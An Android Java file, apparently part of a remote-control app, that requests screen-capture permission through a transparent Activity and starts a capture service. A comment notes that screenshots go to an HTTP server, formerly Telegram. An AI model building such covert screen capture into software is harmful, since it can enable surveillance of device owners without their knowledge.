package com.remotecontrol;

import android.app.Activity;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.util.Log;

/**
 * Прозрачная Activity — запрашивает разрешение MediaProjection
 * и передаёт результат в ScreenCaptureService.
 * chatId убран — скриншот уходит на HTTP сервер, не в Telegram.
 */
public class ScreenCaptureRequestActivity extends Activity {

    private static final String TAG = "SCRequestActivity";
    private static final int REQ_MEDIA_PROJECTION = 1001;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        MediaProjectionManager mpm =
                (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);

        if (mpm != null) {
            startActivityForResult(mpm.createScreenCaptureIntent(), REQ_MEDIA_PROJECTION);
        } else {
            Log.e(TAG, "MediaProjectionManager недоступен");
            finish();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == REQ_MEDIA_PROJECTION) {
            if (resultCode == Activity.RESULT_OK && data != null) {
                Log.i(TAG, "Разрешение MediaProjection получено");
                Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
                serviceIntent.putExtra(ScreenCaptureService.EXTRA_RESULT_CODE, resultCode);
                serviceIntent.putExtra(ScreenCaptureService.EXTRA_RESULT_DATA, data);
                startForegroundService(serviceIntent);
            } else {
                Log.w(TAG, "Разрешение MediaProjection отклонено");
            }
        }
        finish();
    }
}
